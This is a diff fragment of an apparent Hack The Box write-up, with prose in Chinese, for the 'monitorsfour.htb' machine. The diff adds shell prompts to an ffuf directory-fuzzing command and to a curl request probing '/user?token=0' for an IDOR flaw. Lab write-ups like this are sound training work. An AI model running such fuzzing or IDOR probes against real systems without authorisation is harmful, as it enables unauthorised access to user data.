@@ -55,7 +55,7 @@ user                    [Status: 200, Size: 35, Words: 3, Lines: 1]
 users                   [Status: 200, Size: 35, Words: 3, Lines: 1]
 logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
 :: Progress: [87664/87664] :: Job [1/1] :: 118 req/sec :: Duration: [0:12:17] :: Errors: 0 ::
-ffuf -u http://monitorsfour.htb/FUZZ -w /snap/seclists/1214/Discovery/Web-Content/raft-medium-directories.txt
+$ ffuf -u http://monitorsfour.htb/FUZZ -w /snap/seclists/1214/Discovery/Web-Content/raft-medium-directories.txt
 ...
 login                   [Status: 200, Size: 4340, Words: 1342, Lines: 96]
 contact                 [Status: 200, Size: 367, Words: 34, Lines: 5]
@@ -90,7 +90,7 @@ forgot-password         [Status: 200, Size: 3099, Words: 164, Lines: 84]
 ```
 那這些就很有可能會有IDOR(Insecure Direct Object Reference)的問題，如果request`/user?token=0`會怎麼樣呢
 ```bash
-curl -s "http://monitorsfour.htb/user?token=0"
+$ curl -s "http://monitorsfour.htb/user?token=0"
 ```
 ```json
 [
